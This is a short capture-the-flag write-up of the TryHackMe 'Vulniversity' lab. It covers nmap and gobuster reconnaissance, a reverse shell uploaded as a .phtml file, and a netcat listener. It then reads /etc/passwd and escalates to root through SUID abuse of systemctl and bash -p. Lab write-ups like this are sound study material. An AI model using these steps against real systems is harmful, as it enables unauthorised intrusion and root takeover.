# Matheus Jesus 10-04-2020

## Try Hack Me - [Vulniversity](https://tryhackme.com/room/vulnversity)

### IP 10.10.42.87

### 1. Reconnaisance

```sh
nmap -sC -sV -oN nmap_initial 10.10.42.87
```

```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
```

### Go Buster

gobuster dir -u http://10.10.42.87:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

Found directory /internal/ that allows upload of files.

### Script to find extensions allowed

.phtml allowed

* Upload revshell.phtml file to server
* Open /internal/uploads and execute the script
* call nc -lnvp 1234
* open TTY - python -c 'import pty; pty.spawn("/bin/bash")'
* cat /etc/passwd to see users -> found bill
* cd /home/bill && cat user.txt -> Found flag

### Privilege Escalation

* Refer to https://gtfobins.github.io/gtfobins/systemctl/
* Grab Script -> on Script file.
* Execute it on server
* ls -l /bin/bash -> verify permissions.
* The s permission allows any user to run bash -p to become root
* access /root/root.txt
